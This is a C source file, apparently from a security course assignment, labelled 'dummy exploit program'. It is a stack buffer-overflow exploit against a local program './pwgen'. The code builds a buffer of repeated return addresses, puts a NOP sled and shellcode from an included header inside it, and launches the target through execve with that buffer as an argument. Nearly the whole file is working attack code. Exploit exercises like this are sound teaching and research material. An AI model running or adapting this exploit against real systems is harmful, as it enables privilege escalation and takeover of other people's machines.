/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define DBSIZE 700
#define DOFFSET 0
#define TARGET "./pwgen"  // 修改路径
#define NOP   0x90


int main(int argc, char *argv[])
{
  char *args[4];
  char *env[1];
  char *buf, *ptr;
  long *addr_ptr, addr;
  // one way to invoke pwgen, system() creates a separate process
  int i;
  int bsize = DBSIZE, offset = DOFFSET;

 


  if(!(buf = malloc(bsize))){
    printf("error");
    exit(0);
  }
  addr = 0xbfd7dfff;  // 初始化addr
  printf("Using address 0x%lx...", addr);  // 使用%lx而不是%x


  
  ptr = buf; 
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
  *(addr_ptr++) = 0xbfd7dfff;
 for(i = 0 ; i < bsize/2 ; i++)
 buf[i] = NOP;

  ptr = buf + ((bsize/2)  - (strlen(shellcode)/2 ));
  for (i = 0 ; i <strlen(shellcode);i++)
      *(ptr++) = shellcode[i];

   
    buf[bsize - 1] = '\0';//jump here. not overwrite here.
   
 
   
    args[0] = buf; args[1] = "-h";
    args[2] = NULL; 
args[3] = NULL;
    env[0] = NULL;
  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e.,
  // execve() should never return
  if (execve(TARGET, args, env) < 0)
  fprintf(stderr, "execve failed.\n");



//printf("%s %s %s",args[0], args[1],  args[2]);
  exit(0);
}
